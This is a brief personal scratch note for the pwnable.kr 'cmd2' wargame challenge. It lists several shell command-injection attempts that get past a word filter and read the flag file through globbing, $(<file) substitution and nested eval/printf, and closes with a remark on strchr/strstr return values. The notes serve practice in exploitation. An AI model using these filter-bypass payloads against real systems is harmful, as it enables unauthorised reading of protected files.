# pwnable.kr: cmd2

`./cmd2 \$\(\<fl\)`

`printf "echo \$(<$(echo fla*))\n"`

`eval echo eval printf "echo \$(<$(echo fla*))"`

`eval "echo \$(<$(echo fla*))"`

`eval "echo $(<$(echo fla*))"`

`eval echo eval "\$(<$(echo fla*))"`

oops strchr/strstr returns ptr to first occ, but NULL if no occ.

